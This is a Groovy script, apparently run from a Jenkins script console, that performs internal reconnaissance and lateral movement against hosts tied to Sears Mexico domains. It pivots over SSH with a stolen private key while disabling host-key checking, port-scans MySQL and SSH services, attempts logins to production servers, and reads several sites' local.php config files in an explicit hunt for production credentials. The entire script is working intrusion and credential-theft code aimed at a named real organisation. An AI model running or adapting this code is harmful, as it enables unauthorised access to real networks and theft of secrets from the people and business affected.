// Probe T1Pagos DB en 172.27.141.26:3306 + probe más configs + SSH a PROD Sears desde jail
def exec = { cmd ->
    def proc = cmd.execute()
    def out = new StringBuilder()
    def err = new StringBuilder()
    proc.consumeProcessOutput(out, err)
    proc.waitForOrKill(30000)
    return out.toString() + (err.toString() ? "\nSTDERR:" + err.toString() : "")
}

def sshExec = { cmd ->
    def fullCmd = ["bash", "-c", "ssh -i /tmp/ssh_pivot/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes jenkins@172.27.141.4 \"${cmd.replace('"', '\\"')}\" 2>&1"]
    return exec(fullCmd)
}

// Helper: TCP probe directo desde Jenkins
def tcpProbe = { host, port ->
    try {
        def sock = new java.net.Socket()
        sock.connect(new java.net.InetSocketAddress(host, port), 3000)
        def bannerBuf = new byte[100]
        def n = sock.inputStream.read(bannerBuf, 0, 100)
        sock.close()
        if (n > 0) {
            return "OPEN - banner: " + new String(bannerBuf, 0, n, "ISO-8859-1").take(50).replaceAll("[^\\x20-\\x7E]", ".")
        }
        return "OPEN (no banner)"
    } catch (Exception e) {
        return "CLOSED/FILTERED: " + e.message
    }
}

println "=== PROBE DESDE JENKINS A 172.27.141.26 ==="
println "172.27.141.26:3306 = " + tcpProbe("172.27.141.26", 3306)
println "172.27.141.26:3310 = " + tcpProbe("172.27.141.26", 3310)
println "172.27.141.26:22 = " + tcpProbe("172.27.141.26", 22)
println "172.27.141.4:3306 = " + tcpProbe("172.27.141.4", 3306)
println "172.27.141.4:3310 = " + tcpProbe("172.27.141.4", 3310)
println "172.27.141.24:3308 = " + tcpProbe("172.27.141.24", 3308)
println "172.27.141.24:3306 = " + tcpProbe("172.27.141.24", 3306)

println "\n=== SSH DESDE JAIL A PROD SEARS (roman.guevara) ==="
println sshExec("ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -o BatchMode=no roman.guevara@172.27.141.24 'id; hostname; ls /' 2>&1 || echo FAILED")

println "\n=== SSH DESDE JAIL A PROD SEARS (jenkins key) ==="
println sshExec("ssh -i /tmp/ssh_pivot/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=8 jenkins@172.27.141.24 'id; hostname' 2>&1 || echo FAILED")

println "\n=== PROBE RED DESDE JAIL A 172.27.141.26 ==="
println sshExec("(echo > /dev/tcp/172.27.141.26/3306) 2>&1 && echo '172.27.141.26:3306 OPEN' || echo '172.27.141.26:3306 CLOSED'")
println sshExec("(echo > /dev/tcp/172.27.141.26/3310) 2>&1 && echo '172.27.141.26:3310 OPEN' || echo '172.27.141.26:3310 CLOSED'")

println "\n=== LEER MAS CONFIGS PARA CREDS PROD SEARS ==="

// apifincadob en any config  
println "--- alpha.dev.sears.com.mx config ---"
println sshExec("ls /var/www/sites/alpha.dev.sears.com.mx/config/autoload/ 2>&1")
println sshExec("cat /var/www/sites/alpha.dev.sears.com.mx/config/autoload/local.php 2>&1 | tail -60 2>&1 || cat /var/www/sites/alpha.dev.sears.com.mx/config/autoload/local.php 2>&1")

println "--- ats.dev.sears.com.mx config (recent) ---"
println sshExec("ls /var/www/sites/ats.dev.sears.com.mx/config/autoload/ 2>&1")
println sshExec("cat /var/www/sites/ats.dev.sears.com.mx/config/autoload/local.php 2>&1")

println "--- sears-credito.dev.sears.com.mx config ---"
println sshExec("ls /var/www/sites/sears-credito.dev.sears.com.mx/ 2>&1")
println sshExec("ls /var/www/sites/sears-credito.dev.sears.com.mx/config/autoload/ 2>&1")
println sshExec("cat /var/www/sites/sears-credito.dev.sears.com.mx/config/autoload/local.php 2>&1")

println "--- axii.dev.sears.com.mx config (recently modified Aug 20) ---"
println sshExec("ls /var/www/sites/axii.dev.sears.com.mx/ 2>&1")
println sshExec("ls /var/www/sites/axii.dev.sears.com.mx/config/autoload/ 2>&1")
println sshExec("cat /var/www/sites/axii.dev.sears.com.mx/config/autoload/local.php 2>&1")

println "\n=== FIN ==="
